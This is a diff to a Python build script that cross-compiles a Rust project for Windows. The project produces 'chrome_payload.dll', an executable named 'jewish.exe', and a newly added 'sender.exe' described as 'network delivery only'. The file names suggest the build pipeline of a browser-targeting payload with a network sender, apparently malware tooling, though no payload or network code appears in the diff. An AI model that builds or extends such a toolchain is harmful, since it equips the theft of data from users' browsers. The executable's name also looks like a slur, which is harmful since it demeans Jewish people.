@@ -90,6 +90,7 @@ else:
     _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "x86_64-pc-windows-gnu", "release")
 
 TARGET_EXE = os.path.join(_TARGET_REL, "jewish.exe")
+TARGET_SENDER = os.path.join(_TARGET_REL, "sender.exe")
 TARGET_DLL = os.path.join(_TARGET_REL, "chrome_payload.dll")
 
 
@@ -345,6 +346,18 @@ def main():
         sys.exit(1)
     dll_size = os.path.getsize(TARGET_DLL)
     print(f"[+] DLL (64-bit) size: {dll_size} bytes")
+
+    # Step 3b: Build embedded sender (network delivery only)
+    print("\n===== 2b/7 Building sender.exe =====")
+    if not run_command(_cargo_cmd + ["build", "--release", "--bin", "sender"] + _CARGO_EXTRA, "Building sender.exe"):
+        print("[!] Sender build failed - aborting")
+        sys.exit(1)
+    if not os.path.exists(TARGET_SENDER):
+        print(f"[!] Sender not produced at {TARGET_SENDER}")
+        sys.exit(1)
+    sender_size = os.path.getsize(TARGET_SENDER)
+    print(f"[+] Sender size: {sender_size} bytes")
+    os.environ["SENDER_EXE"] = TARGET_SENDER
 
     # Step 4: Build main executable
     print("\n===== 3/7 Building jewish.exe =====")
